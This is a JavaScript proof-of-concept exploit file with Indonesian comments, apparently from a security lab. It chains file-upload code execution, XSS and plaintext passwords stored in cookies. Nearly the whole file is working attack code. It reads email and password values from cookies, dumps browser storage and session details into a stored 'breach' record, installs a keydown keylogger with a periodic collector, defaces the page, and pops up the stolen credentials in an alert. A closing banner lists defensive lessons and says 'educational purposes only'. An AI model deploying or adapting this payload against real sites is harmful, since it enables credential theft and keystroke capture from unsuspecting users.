// ðŸ”¥ ULTIMATE EXPLOIT - Kombinasi Semua Vulnerability
// File: ultimate_exploit.js
// Deskripsi: Payload yang mengeksploitasi File Upload RCE, XSS, dan Cookie Credential Storage

console.log('ðŸš¨ ULTIMATE EXPLOIT PAYLOAD ACTIVATED!');
console.log('ðŸ“… Timestamp:', new Date().toString());

// ===========================================
// 1. CREDENTIAL THEFT dari COOKIES (CRITICAL)
// ===========================================

console.log('ðŸ”“ Step 1: EXTRACTING CREDENTIALS FROM COOKIES...');

const cookies = document.cookie.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    if (key && value) {
        acc[key] = decodeURIComponent(value);
    }
    return acc;
}, {});

const stolenCredentials = {
    email: cookies.user_email || 'Not found',
    password: cookies.user_password || 'Not found', // PLAINTEXT PASSWORD!
    userID: cookies.user_id || 'Not found',
    userName: cookies.user_name || 'Not found',
    userRole: cookies.user_role || 'Not found',
    loginTimestamp: cookies.login_timestamp || 'Not found'
};

console.log('ðŸ”‘ CREDENTIALS SUCCESSFULLY STOLEN:');
console.log('ðŸ“§ Email:', stolenCredentials.email);
console.log('ðŸ” Password:', stolenCredentials.password);
console.log('ðŸ†” User ID:', stolenCredentials.userID);
console.log('ðŸ‘¤ Name:', stolenCredentials.userName);
console.log('ðŸ·ï¸ Role:', stolenCredentials.userRole);

// ===========================================
// 2. DATA EXFILTRATION
// ===========================================

console.log('ðŸ—ƒï¸ Step 2: COMPREHENSIVE DATA EXFILTRATION...');

const completeDataBreach = {
    // Stolen credentials (most critical)
    credentials: stolenCredentials,
    
    // Browser storage
    localStorage: (() => {
        try {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                ls[key] = localStorage.getItem(key);
            }
            return ls;
        } catch (e) {
            return 'Access denied';
        }
    })(),
    
    sessionStorage: (() => {
        try {
            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                ss[key] = sessionStorage.getItem(key);
            }
            return ss;
        } catch (e) {
            return 'Access denied';
        }
    })(),
    
    // All cookies
    allCookies: document.cookie,
    
    // Browser and session info
    browserInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine
    },
    
    // Page info
    pageInfo: {
        url: window.location.href,
        origin: window.location.origin,
        pathname: window.location.pathname,
        title: document.title,
        referrer: document.referrer
    },
    
    // Timestamp
    breach: {
        timestamp: new Date().toString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        exploitType: 'File Upload RCE + XSS + Cookie Credential Theft'
    }
};

console.log('ðŸ’¾ COMPLETE DATA BREACH PACKAGE:');
console.log(completeDataBreach);

// ===========================================
// 3. PERSISTENCE MECHANISM
// ===========================================

console.log('ðŸ”§ Step 3: INSTALLING PERSISTENCE MECHANISMS...');

// Store stolen data for later use
try {
    localStorage.setItem('BREACH_DATA', JSON.stringify(completeDataBreach));
    localStorage.setItem('EXPLOIT_STATUS', 'ACTIVE');
    localStorage.setItem('BACKDOOR_INSTALLED', new Date().toString());
    console.log('âœ… Persistence data stored in localStorage');
} catch (e) {
    console.log('âŒ Failed to store in localStorage:', e.message);
}

// ===========================================
// 4. KEYLOGGER INSTALLATION
// ===========================================

console.log('âŒ¨ï¸ Step 4: INSTALLING KEYLOGGER...');

let keystrokeLog = [];

document.addEventListener('keydown', function(event) {
    const timestamp = new Date().toString();
    const logEntry = {
        key: event.key,
        code: event.code,
        timestamp: timestamp,
        target: event.target.tagName
    };
    
    keystrokeLog.push(logEntry);
    console.log('ðŸ”‘ Keystroke captured:', logEntry);
    
    // Store periodically
    if (keystrokeLog.length % 10 === 0) {
        try {
            localStorage.setItem('KEYLOG', JSON.stringify(keystrokeLog));
        } catch (e) {
            // Silent fail
        }
    }
});

console.log('âœ… Keylogger successfully installed');

// ===========================================
// 5. VISUAL PROOF OF COMPROMISE
// ===========================================

console.log('ðŸŽ¨ Step 5: CREATING VISUAL PROOF...');

// Create persistent notification
const createNotification = () => {
    const notification = document.createElement('div');
    notification.id = 'breach-notification';
    notification.innerHTML = `
        <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background: linear-gradient(45deg, #ff0000, #cc0000);
            color: white;
            text-align: center;
            z-index: 999999;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 14px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
            border-bottom: 3px solid #990000;
        ">
            ðŸš¨ SECURITY BREACH DETECTED ðŸš¨<br>
            <span style="font-size: 12px;">
                Credentials Stolen | File Upload RCE Active | XSS Payload Executed
            </span>
        </div>
    `;
    
    // Remove existing notification
    const existing = document.getElementById('breach-notification');
    if (existing) {
        existing.remove();
    }
    
    document.body.appendChild(notification);
};

// Create visual effects
document.body.style.border = '5px solid #ff0000';
document.body.style.boxShadow = 'inset 0 0 20px rgba(255, 0, 0, 0.3)';

createNotification();

// ===========================================
// 6. ATTACK SUMMARY & ALERTS
// ===========================================

console.log('ðŸ“Š Step 6: GENERATING ATTACK SUMMARY...');

const attackSummary = `
ðŸ”¥ ULTIMATE EXPLOIT EXECUTION COMPLETE! ðŸ”¥

ðŸŽ¯ VULNERABILITIES EXPLOITED:
âœ… File Upload RCE - Payload executed via eval()
âœ… Cookie Credential Storage - Plaintext passwords stolen
âœ… XSS Capability - JavaScript injection successful

ðŸ”“ CREDENTIALS COMPROMISED:
ðŸ“§ Email: ${stolenCredentials.email}
ðŸ”‘ Password: ${stolenCredentials.password}
ðŸ‘¤ User: ${stolenCredentials.userName}
ðŸ·ï¸ Role: ${stolenCredentials.userRole}

âš ï¸ PERSISTENCE ESTABLISHED:
âœ… Keylogger installed
âœ… Data stored in localStorage
âœ… Visual proof displayed
âœ… Complete data breach logged

ðŸš¨ SECURITY IMPACT: CRITICAL
This demonstrates why:
- File uploads must be validated and sandboxed
- Passwords should NEVER be stored in cookies
- XSS protection is essential
- Input sanitization is crucial

Educational purposes only - DO NOT use maliciously!
`;

console.log(attackSummary);

// Show summary to user
alert('ðŸ”¥ ULTIMATE EXPLOIT COMPLETE!\n\n' +
      'Vulnerabilities chained successfully:\n' +
      'âœ… File Upload RCE\n' +
      'âœ… Cookie Credential Theft\n' +
      'âœ… XSS Injection\n' +
      'âœ… Persistent Backdoor\n\n' +
      'Check console for full details!\n\n' +
      'âš ï¸ Email: ' + stolenCredentials.email + '\n' +
      'âš ï¸ Password: ' + stolenCredentials.password);

// ===========================================
// 7. CLEANUP & FINAL ACTIONS
// ===========================================

console.log('ðŸ§¹ Step 7: FINALIZING EXPLOIT...');

// Set up periodic data collection
setInterval(() => {
    try {
        const currentData = {
            url: window.location.href,
            timestamp: new Date().toString(),
            keystrokesCount: keystrokeLog.length
        };
        localStorage.setItem('CURRENT_SESSION', JSON.stringify(currentData));
    } catch (e) {
        // Silent fail
    }
}, 30000); // Every 30 seconds

console.log('âœ… ULTIMATE EXPLOIT INSTALLATION COMPLETE!');
console.log('ðŸ“… Exploit will remain active until browser/storage is cleared');
console.log('ðŸ” All activities are being logged for educational demonstration');

// Final confirmation
setTimeout(() => {
    console.log('ðŸŽ‰ EXPLOIT CHAIN SUCCESSFUL - All vulnerabilities demonstrated!');
}, 2000);